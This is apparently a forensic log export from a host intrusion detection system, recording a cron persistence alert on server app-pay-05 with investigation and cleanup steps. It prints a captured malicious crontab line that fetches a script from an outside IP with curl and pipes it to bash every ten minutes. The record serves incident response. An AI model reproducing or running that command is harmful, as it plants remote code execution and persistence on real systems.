@@ -1,0 +1,23 @@
+==============================================================================
+ 青藤云 HIDS  取证日志导出
+ 导出时间: 2026-06-19 01:46:47  时区: Asia/Shanghai (UTC+8)
+ 关联规则: HIDS-PERSIST-0540  crontab 写入网络下载执行任务
+ ATT&CK: T1053.003 Cron
+==============================================================================
+
+2026-06-18 03:50:00  app-pay-05  EventID=1 (ProcessCreate / Auth)
+  Computer: app-pay-05
+  User: tomcat
+  Image/Process: /var/spool/cron/tomcat
+  CommandLine: */10 * * * * curl -fsSL http://45.32.118.9/m.sh | bash
+  ParentImage: -
+  Action: 计划任务创建
+  Hashes: SHA256=-
+
+2026-06-18 03:50:00  app-pay-05  EventID=3 (NetworkConnect)
+  SourceIp: 10.60.3.5  DestinationIp: 45.32.118.9:-
+  DestinationHostname: -
+
+VERDICT: UNDER_INVESTIGATION
+KeyEvidence: crontab 每 10 分钟 curl|bash；下载源与反弹 Shell C2 一致；用户 tomcat
+Handling: 清除恶意 cron 条目，抓取 m.sh 研判载荷，结合反弹 Shell 告警一并处置。
